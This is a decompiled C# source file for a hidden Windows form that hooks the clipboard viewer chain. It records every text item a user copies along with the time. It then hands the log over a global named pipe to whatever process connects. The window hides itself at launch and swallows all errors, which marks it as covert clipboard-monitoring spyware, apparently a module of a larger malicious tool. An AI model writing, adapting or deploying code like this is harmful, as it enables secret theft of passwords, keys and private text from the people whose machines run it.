using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Session1.ClipBoard;

public class ClipBoardForm1 : Form
{
	public List<ClipInfo> ClipInfos = new List<ClipInfo>();

	public object syncroot = new object();

	private IntPtr nextClipboardViewer;

	private IContainer components;

	public ClipBoardForm1()
	{
		InitializeComponent();
	}

	private void ClipBoardForm1_Load(object sender, EventArgs e)
	{
		nextClipboardViewer = (IntPtr)NtApi32.SetClipboardViewer((int)((Control)this).get_Handle());
		ThreadPool.QueueUserWorkItem(delegate
		{
			while (true)
			{
				try
				{
					using NamedPipeServerStream namedPipeServerStream = new NamedPipeServerStream("\\\\.\\pipe\\Global\\ClipBoardaaaa", PipeDirection.InOut);
					namedPipeServerStream.WaitForConnection();
					List<byte> list = new List<byte>();
					lock (syncroot)
					{
						foreach (ClipInfo clipInfo in ClipInfos)
						{
							list.AddRange(Encoding.UTF8.GetBytes(clipInfo.time + "\r\n"));
							list.AddRange(Encoding.UTF8.GetBytes(clipInfo.type + "\r\n"));
							list.AddRange(Encoding.UTF8.GetBytes(clipInfo.content + "\r\n"));
						}
						ClipInfos.Clear();
					}
					if (list.Count > 0)
					{
						List<byte> list2 = new List<byte>();
						list2.AddRange(BitConverter.GetBytes(list.Count));
						list2.AddRange(list);
						namedPipeServerStream.Write(list2.ToArray(), 0, list2.Count);
					}
				}
				catch
				{
				}
			}
		});
	}

	public void DisplayClipboardData()
	{
		try
		{
			if (!NtApi32.OpenClipboard(IntPtr.Zero))
			{
				return;
			}
			if (NtApi32.IsClipboardFormatAvailable(1u))
			{
				IntPtr clipboardData = NtApi32.GetClipboardData(13u);
				if (clipboardData != IntPtr.Zero)
				{
					string text = Marshal.PtrToStringUni(clipboardData);
					ClipInfo item = new ClipInfo
					{
						time = "[ time ]: " + DateTime.Now,
						type = "[ type ]: text",
						content = "[ content ]: " + text
					};
					ClipInfos.Add(item);
				}
			}
			NtApi32.CloseClipboard();
		}
		catch (Exception)
		{
		}
	}

	protected override void WndProc(ref Message m)
	{
		switch (((Message)(ref m)).get_Msg())
		{
		case 776:
			DisplayClipboardData();
			NtApi32.SendMessage(nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
			break;
		case 781:
			if (((Message)(ref m)).get_WParam() == nextClipboardViewer)
			{
				nextClipboardViewer = ((Message)(ref m)).get_LParam();
			}
			else
			{
				NtApi32.SendMessage(nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
			}
			break;
		default:
			((Form)this).WndProc(ref m);
			break;
		}
	}

	private void ClipBoardForm1_Shown(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private void ClipBoardForm1_FormClosing(object sender, FormClosingEventArgs e)
	{
		NtApi32.ChangeClipboardChain(((Control)this).get_Handle(), nextClipboardViewer);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1, 1));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("ClipBoardForm1");
		((Control)this).set_Text("ClipBoardForm1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(ClipBoardForm1_FormClosing));
		((Form)this).add_Load((EventHandler)ClipBoardForm1_Load);
		((Form)this).add_Shown((EventHandler)ClipBoardForm1_Shown);
		((Control)this).ResumeLayout(false);
	}
}
